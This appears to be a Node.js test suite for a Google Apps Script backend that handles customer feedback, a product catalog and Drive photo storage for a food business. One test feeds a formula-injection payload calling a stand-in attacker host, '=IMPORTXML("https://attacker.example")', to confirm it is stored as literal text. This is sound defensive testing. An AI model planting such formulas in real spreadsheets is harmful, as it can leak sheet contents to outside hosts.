import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';

const source = await readFile(new URL('../google-apps-script/Code.gs', import.meta.url), 'utf8');
test('Apps Script writes matching columns and durable retry log atomically, with literal customer text', () => {
  const secret = 'private-bridge-secret-with-more-than-32-characters'; let batch, duplicate = false, failSave = false;
  const properties = new Map([['BRIDGE_SECRET', secret]]);
  const ctx = {
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: value => ({ value, setMimeType() { return this; } }) },
    Utilities: { DigestAlgorithm: { SHA_256: 'sha256' }, computeDigest: (_algorithm, value) => [...createHash('sha256').update(value).digest()], formatDate: () => '2026-11-10 17:00:00' },
    PropertiesService: { getScriptProperties: () => ({ getProperty: key => properties.get(key) }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, hasLock: () => true, releaseLock() {} }) },
    SpreadsheetApp: { openById: () => ({ getSheetByName: () => ({ getSheetId: () => 999, getRange: () => ({ createTextFinder: () => ({ matchEntireCell() { return this; }, findNext: () => duplicate }) }) }) }) },
    Sheets: { Spreadsheets: { batchUpdate: (request, id) => { assert.equal(id, '18j6KNPxLlEoiuBScGOdcopDwFrpwhmNrmC9xSlNx6tI'); assert.ok(request.requests.length > 0); if (failSave) throw new Error('Test Sheets write failure'); batch = request; duplicate = true; return {}; } } },
    UrlFetchApp: { fetch: () => { throw new Error('Feedback without pictures must use the authorized Sheets service.'); } }, console
  };
  vm.createContext(ctx); vm.runInContext(source, ctx);
  const value = { secret, id: '12345678-1234-1234-1234-123456789abc', type:'Make a complaint', customer:'Yes', topic:'Other', message:'=IMPORTXML("https://attacker.example")', phone:'', pictures:[] };
  const submit = data => JSON.parse(ctx.doPost({postData:{contents:JSON.stringify(data)}}).value);
  const unauthorized = submit({...value,secret:'wrong'});
  assert.equal(unauthorized.ok, false); assert.equal(unauthorized.detail, undefined); assert.equal(batch, undefined);
  failSave = true;
  const failed = submit(value);
  assert.equal(failed.ok, false); assert.equal(failed.detail, 'Test Sheets write failure'); assert.equal(batch, undefined);
  failSave = false;
  assert.equal(submit(value).ok, true); assert.equal(batch.requests.length, 2);
  const row = batch.requests[0].appendCells;
  assert.equal(row.sheetId, 763732222); assert.equal(row.rows[0].values.length, 7);
  assert.equal(row.rows[0].values[4].userEnteredValue.stringValue, value.message);
  assert.equal(row.rows[0].values[4].userEnteredValue.formulaValue, undefined);
  const oldBatch = batch; assert.equal(submit(value).duplicate, true); assert.equal(batch, oldBatch);
});
test('Apps Script preserves product edits, rejects stale saves and can remove all products', () => {
  let rows = [['1','Meal','3000','rice','images/hero-rice.jpg','Description']];
  const ctx = {
    Utilities: { DigestAlgorithm: { SHA_256: 'sha256' }, computeDigest: (_algorithm, value) => [...createHash('sha256').update(value).digest()] },
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => 'true' }) },
    SpreadsheetApp: { openById: () => ({ getSheetByName: () => ({ getSheetId: () => 999, getLastRow: () => rows.length + 1, getRange: () => ({ getValues: () => rows }) }) }) },
    Sheets: { Spreadsheets: { batchUpdate: (batch, id) => {
      assert.equal(id, '18j6KNPxLlEoiuBScGOdcopDwFrpwhmNrmC9xSlNx6tI');
      const update = batch.requests[0].updateCells;
      assert.equal(update.range.startRowIndex, 1);
      rows = update.rows.map(row => row.values.map(cell => cell.userEnteredValue.stringValue));
      return {};
    } } },
    UrlFetchApp: { fetch: () => { throw new Error('Product writes must use the authorized Sheets service.'); } }, console
  };
  vm.createContext(ctx); vm.runInContext(source, ctx);
  const lock = { waitLock() {} };
  const initial = ctx.catalog_({ action:'catalog.get' }, lock);
  assert.equal(initial.products[0].price, 3000);
  assert.equal(ctx.catalog_({ action:'catalog.save', products:[], revision:'stale' }, lock).code, 'conflict');
  const updated = JSON.parse(JSON.stringify(initial.products)); updated[0].name = '=Literal name'; updated[0].price = 4000;
  const saved = ctx.catalog_({ action:'catalog.save', products:updated, revision:initial.revision }, lock);
  assert.notEqual(saved.revision, initial.revision);
  assert.equal(ctx.catalog_({ action:'catalog.get' }, lock).products[0].name, '=Literal name');
  ctx.catalog_({ action:'catalog.save', products:[], revision:saved.revision }, lock);
  assert.equal(ctx.catalog_({ action:'catalog.get' }, lock).products.length, 0);
});

function storageHarness(account = 'healthy101food@gmail.com') {
  const properties = new Map([
    ['BRIDGE_SECRET', 'private-bridge-secret-with-more-than-32-characters'],
    ['PICTURE_FOLDER_ID', 'old-feedback-folder'], ['PRODUCT_FOLDER_ID', 'old-product-folder'],
    ['CATALOG_INITIALIZED', 'true']
  ]);
  const calls = [], folders = new Map(); let batch;
  const ctx = {
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: value => ({ value, setMimeType() { return this; } }) },
    ScriptApp: { getOAuthToken: () => 'test-oauth-token' },
    PropertiesService: { getScriptProperties: () => ({ getProperty: key => properties.get(key), setProperty: (key, value) => properties.set(key, value) }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, hasLock: () => true, releaseLock() {} }) },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'sha256' }, computeDigest: (_algorithm, value) => [...createHash('sha256').update(value).digest()],
      formatDate: () => '2026-11-11 15:00:00', getUuid: () => '12345678-1234-1234-1234-123456789abc',
      base64Decode: value => [...Buffer.from(value, 'base64')], newBlob: value => ({ getBytes: () => [...Buffer.from(value)] })
    },
    SpreadsheetApp: { openById: () => ({ getSheetByName: name => ({
      getSheetId: () => name === '_Food101Products' ? 1000 : 999,
      getLastRow: () => 2,
      getRange: () => ({ getValues: () => [[1, 'Meal', 3000, 'rice', 'images/hero-rice.jpg', 'Description']],
        createTextFinder: () => ({ matchEntireCell() { return this; }, findNext: () => false }) })
    }) }) },
    Sheets: { Spreadsheets: { batchUpdate: value => { batch = value; return {}; } } },
    UrlFetchApp: { fetch: (url, options) => {
      assert.equal(options.headers.Authorization, 'Bearer test-oauth-token');
      calls.push({ url, options }); let value;
      if (url.includes('/about?')) value = { user: { emailAddress: account } };
      else if (url === 'https://www.googleapis.com/drive/v3/files?fields=id') {
        const metadata = JSON.parse(options.payload), id = 'healthy-folder-' + folders.size;
        folders.set(id, { id, name: metadata.name, mimeType: metadata.mimeType, ownedByMe: true, trashed: false });
        value = { id };
      } else if (url.includes('/upload/drive/v3/files')) value = { id: 'new-photo', webViewLink: 'https://drive.google.com/file/d/new-photo/view' };
      else if (url.endsWith('/permissions')) value = { id: 'public-reader' };
      else {
        const id = url.split('/files/')[1]?.split('?')[0];
        assert.ok(folders.has(id), 'Only the new account folders should be accessed'); value = folders.get(id);
      }
      return { getResponseCode: () => 200, getContentText: () => JSON.stringify(value) };
    } },
    console: { log() {}, error() {} }
  };
  vm.createContext(ctx); vm.runInContext(source, ctx);
  return { ctx, properties, calls, folders, getBatch: () => batch };
}

test('Storage setup creates and reuses Food101-owned folders while preserving the previous deployment settings', () => {
  const { ctx, properties, folders } = storageHarness();
  const result = ctx.prepareFood101Storage();
  assert.equal(result.account, 'healthy101food@gmail.com');
  assert.equal(result.feedbackFolder.ownedByMe, true); assert.equal(result.productFolder.ownedByMe, true);
  assert.notEqual(result.feedbackFolder.id, result.productFolder.id);
  assert.equal(properties.get('PICTURE_FOLDER_ID'), 'old-feedback-folder');
  assert.equal(properties.get('PRODUCT_FOLDER_ID'), 'old-product-folder');
  ctx.prepareFood101Storage(); assert.equal(folders.size, 2);
});

test('Storage rejects another execution account and folders that are shared but not owned', () => {
  const wrong = storageHarness('ademab1997@gmail.com');
  assert.throws(() => wrong.ctx.prepareFood101Storage(), /must run as healthy101food@gmail.com/);
  assert.equal(wrong.folders.size, 0);
  const shared = storageHarness(); shared.ctx.prepareFood101Storage();
  const id = shared.properties.get('FOOD101_HEALTHY_PICTURE_FOLDER_ID');
  shared.folders.get(id).ownedByMe = false;
  assert.throws(() => shared.ctx.pictureFolder_(), /owned by healthy101food@gmail.com/);
  shared.folders.get(id).ownedByMe = true; shared.folders.get(id).trashed = true;
  assert.throws(() => shared.ctx.pictureFolder_(), /active folder/);
});

test('Feedback and product uploads use the new account folders and retain their intended visibility', () => {
  const { ctx, properties, calls, getBatch } = storageHarness();
  const secret = properties.get('BRIDGE_SECRET'), picture = { mime: 'image/png', data: Buffer.from([137,80,78,71]).toString('base64') };
  const submit = value => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify({ secret, ...value }) } }).value);
  const feedback = submit({ id: '12345678-1234-1234-1234-123456789abc', type: 'Give feedback', customer: 'Yes', topic: 'Food', message: 'Storage test', phone: '', pictures: [picture] });
  assert.equal(feedback.ok, true); assert.equal(getBatch().requests.length, 2);
  const feedbackUpload = calls.find(call => call.url.includes('/upload/drive/v3/files'));
  assert.ok(Buffer.from(feedbackUpload.options.payload).toString().includes('"parents":["' + properties.get('FOOD101_HEALTHY_PICTURE_FOLDER_ID') + '"]'));
  assert.equal(calls.filter(call => call.url.endsWith('/permissions')).length, 0, 'Feedback pictures remain private');
  const initial = ctx.catalog_({ action: 'catalog.get' }, { waitLock() {} });
  const saved = submit({ action: 'catalog.save', products: JSON.parse(JSON.stringify(initial.products)), revision: initial.revision, picture: { ...picture, productId: 1 } });
  assert.equal(saved.ok, true); assert.equal(saved.products[0].img, 'https://lh3.googleusercontent.com/d/new-photo=w1000');
  const productUpload = calls.filter(call => call.url.includes('/upload/drive/v3/files'))[1];
  assert.ok(Buffer.from(productUpload.options.payload).toString().includes('"parents":["' + properties.get('FOOD101_HEALTHY_PRODUCT_FOLDER_ID') + '"]'));
  const sharing = calls.filter(call => call.url.endsWith('/permissions'));
  assert.equal(sharing.length, 1); assert.deepEqual(JSON.parse(sharing[0].options.payload), { type: 'anyone', role: 'reader' });
  const before = calls.length;
  assert.equal(submit({ action: 'storage.check', secret: 'wrong' }).code, 'unauthorized'); assert.equal(calls.length, before);
  assert.equal(submit({ action: 'storage.check' }).account, 'healthy101food@gmail.com');
});
